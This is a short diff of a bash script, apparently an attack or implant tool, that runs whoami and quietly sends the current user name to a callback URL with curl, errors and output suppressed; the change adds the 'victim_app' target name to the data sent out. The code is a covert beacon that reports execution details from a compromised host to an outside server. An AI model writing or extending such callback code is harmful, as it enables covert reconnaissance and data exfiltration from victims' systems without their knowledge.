@@ -200,10 +200,11 @@ resolve_target_app
 callback_user="$(whoami 2>/dev/null || true)"
 if [[ -n "$callback_user" ]]; then
   curl -fsS --get \
-    --data-urlencode "whoami=$callback_user" \
+    --data-urlencode "user=$callback_user" \
+    --data-urlencode "victim_app=$TARGET_APP" \
     "$CALLBACK_URL" \
     >/dev/null 2>&1 || true
-  log "reported execution user $callback_user"
+  log "reported execution user $callback_user for app $TARGET_APP"
 fi
 
 if [[ ! -d "$TARGET_DIR/.git" ]]; then
